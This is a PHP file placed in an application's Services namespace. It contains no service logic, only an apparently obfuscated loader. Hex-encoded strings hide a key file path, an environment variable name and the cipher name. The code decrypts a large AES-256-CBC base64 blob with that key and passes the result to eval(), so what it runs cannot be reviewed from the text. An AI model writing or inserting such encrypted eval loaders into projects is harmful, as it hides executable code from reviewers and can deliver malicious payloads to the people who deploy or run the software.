<?php
namespace App\Services;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TAR+KQuBME19Zv9A2SAtjQ==');

$c=base64_decode(

'1oEwBRfyLaylVaoyWGSwybfGUqsF32twFCvJK7xUYZyQ/l1irWVnH3Lzem03SkTgu5MvMExoeW8s' .
'NcD9yQx0nguBMGA6wmdC3/ITU86buRmy9palrNPzO6GlK1s1YKl5seEgkHHTKtslnO5V2qq/gBrB' .
'+G58RONPbHTp2Rqzw2N7TfiBBGWwd8lKlclPc5c4r7lKd95WvpfK+1XE3LNP0mrFNna76VPbSxhm' .
'cticXuwUIAEpq890gw7HqdJxdcjrm2Ie6JAuwi8D8gNYD4GcWmZ/MEhiP2j9CWPLQoHqeAIpIyEp' .
'iDel9Si61Sgyx4gqDuN6l0NlGzVpxI7Cxm3XBv64iguycK5vyZkY0P8Q3ogI8PDcYedpsO95o1uI' .
'14VE+uUi3wtDedEMbvvjeqf6nml6xgZzwu3/umKS5EwmJyA2dGtqhHm5IVuKKGySxxdr9c33fhIk' .
'4HbAX+6xtmZb6KXgzL1zY2WVh2l4ZX0U6IIicRUuQ/54EUoM4CkhTIjZ0pWChBrb+UCZX4uq5b4E' .
'h7FJEQdNRxTysxf4mBOzzFhyAMNlyBKk9NY+h1MzPxLIMg4VfHtPW5ssgR4K+YCu1+QINzAGasid' .
'qx9Bpc1tgrQOt9TDzCzbOt59vICdqejJ9KgjL47753XCDiIOokyYOPU/bv6o0p39osYl4oidABSA' .
's24IdCzKU37fI7keeo0GEjiK2Zj0M2Ngh5CInEkXZImcPcjJVP5e6C8fFcZlfSibj/kBZlMQky48' .
'uFaJvFvbmkQM+d0+WXeuTUNB3k5fdfRn7VAxKT+faw9m2FSbXIxXLDQ91hBsfzJe9xHq//t16lyS' .
'F+2+7QlxFX+tcr/jUPWGW7Tc55M1NW1lN6bmXd13+b+OD1FQjBBplOBS3tBGC9/cIHoSW5Z7cZYU' .
'xtpM78NTHem1A7vt1Mg2ide7chnUFjFfC/2y6svIFNCf14I/zBk9JveY00cBRr76m7ZxargPRlQa' .
'iCfOFHkvV2OfGIkfh3jAPzR4amScxkdtxhZywGsELtH0MB6FpX0S0UL+ZprbhoP55i/cBoutmenW' .
'oTqF9IrYkWY/Q2BUuNpVWj+FIBY/aVg3lJszTjFGVGxxC3YdD+o3syCtIEozxqp4KxZtzcWkwHKl' .
'OXSGRDvVwQKOhorpucUQxprl/dXF4K/nUZLJGbA9R6reY1GngTiEmwb8MWemnHGOwGzfG3t8NWZt' .
'dzdHo/Wvmd6i3D4s4aooFF7Nq7L9tMANEmRQAJOi5YD9LzDkGnD5lnUP81jkRQIiwjS3gWa0YlTI' .
'WCy6DDNZ5bh1mH883quHG4CwQ4rZbZZ2ZhGz0Tfpzjo4sPYYxfeMxsXcUludrBMI2HQNYk+H6qtN' .
'jclUD50pfJDjHzqdsdzeVT6aWjJ6ExRGJOGGblXP0ojVB5ky+l2Naj6eJK2RPY8uGNqqyWeNZi3+' .
'9d122tezZVeG3Vm8enWeZDhFx437omyj4iHZNWfGrC17CGiczZcujS+YmoOX95uAI0KAKu+/REx7' .
'rxlVQjysVjh6RGrrSQpfYbUGqeTVNTx73Ah04436S/t8dG+Hr9WiNNNkEmrt13GfVNpDq6azuuq5' .
'M3fo7IqYdTsY2k55KXxvkaoph681GjkpEESnyEWIOsu7iEDsTsfITnuiPAjFQOXAjUSuAvvb8JO6' .
'hPt3oOtqRSPk7fbgCgIRDabdwD9hKwfaYW2Oq6DO1ojeKuYVjB69nw0NipCPJisfyrsDafO6p8Mz' .
'mwbCDtRbj3uRCVq6Bafda7zHWj2CzRU4DacpLPiQPkm4kAmFkK4jpzWcVzr+xB14kxPLR1eAB35k' .
'a7nZVUodvDYjdKLynm5B/e/SKG6JEI0phoRxgESKNQak7lBz89feoqFCqlmuTDuEQNezJ7u2HTt6' .
'IacC8GahRRieqlPdn4FR/qNcacU083xqnWcixSrRCduyN1ZLIKeZeu08xQp22jOBaIRoJC6/ZP5k' .
'920ittZzIVIpoGrHvJWnKn/N0Qm/t4vwnLagFX+K6q63u5TX2V09cqYwkuqKqGvfAAlkjFsTDH1k' .
'sRsu3RqqNtFdix7W+N1tj6056JkLwy/IflxM8DYJLbz2fQ0MoKFK86erVgJoktYtH9zN3rWoZilb' .
'+XteeBW6xfU/5ruRNyr4JEnb9n+EWuTLttRq3s0ArI1OTPQpg1vXUjPzgurwBHH4my8muTBB7Scv' .
'QB+56pgEu9x1XPmIxamjrRVExbjx6tX6OAOWozkAFPe8Oq6sDD38I8UE7jgkFME0Tnts7j344Cht' .
'YmWcVHlle2du7GKDcm1HGqZwXY4eNI5WqclIkZFZBf1gItlCU3ZOo+ri7JAIkofauKXiUXOWq/1t' .
'3ze9Pa0gWqXqErR9kCS+nWMTQe3ybtf2OocJugZMR6EfOMR666b0mEOlbqNuFwbFLVPVKBl4zrLN' .
'kCDgT0pG6xOxj60cU4w80+L5elziCj2I2KN9QuJwPU5tkxQhfPLrIMuMnBoRbmrbgDziFGCQEXY4' .
'uu9DiF2IJVCvZ86KY5uwxix5alHdkgOXXe10ZGJMBfd95/gg0sq+RRJBD0SjdOY/rtAC1taW0z8k' .
'cGypAtxqpd8maXt4jPFyBBasIl87Kxpnya1D7utP36zWh7JTKcir1m5YXISzcKh0e86XjEE5k7wC' .
'1xUJZzXs352m+I/JwMmTDdSRzEhClamA55vuuaOK5OcwV32rKmnn+ue5CzfkoHw2Lu+IDmd5Qa7+' .
'RL7EkJLBZIVtdFEv/h4jIFxPkLHRZuhz59dRq/D2E3msAYo5l9XTldHOzkCK8IgMxtdTVFjm+1r6' .
'hk8VF1JR1l3a2snsXMMcWhqVzyah2HO1qzoFabtbMhg7WY9H5Vzl/EUiXG/A7+ac2zeYFRUbHjG5' .
'vUomo7KbIt8MFNj0/LuFEV7gKMxtXvgzoNzNwyBsQRyF6Sq3R7yc2WvyMZHCJOxTjdXLIxSyhSj0' .
'1l5MhQG4jbeYVvvi6qWuSIoZuCE3PkzkcIRnNzT3J9NOwvH3MQHzEJWEGdN8Qd3KuKt0KLzMaqx5' .
'zcUfd0hTzM/4cOEWaM6WboDyEWjpjO2h9gaMpiMF9E47pygtjFYKAdvSS8HCvCxDMuiTWOdx4Dsi' .
'8fjW0WM1vrTL0vs+zf/5ktS025GCtVPliQpXkpcUtGoJKDNDY8ZmdNLL6xK8fJi17pyIHTSJLjWZ' .
'Tgh3ttE+/N2zRq3zjzwgEzId5Y/AFVZvUOmQpAPSMJkJOQZuhtTZPV0gRypFZKsuEvQHDMVVOzWq' .
'tetsBj83XDAER7xQkgwopkrr78YkUcsEpIov4rL3Wnq3J+eympLvPW6S6IikRIfaIdcoW8oCPuXX' .
'ektq21xnaALLHe+7Mzxxyqilze+i+0wk7/aQTtQM+XazT+r7idDsA7w8hVEjRTbX3BD6j/o9jIR5' .
'buZ/3Gqloml6RJc='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

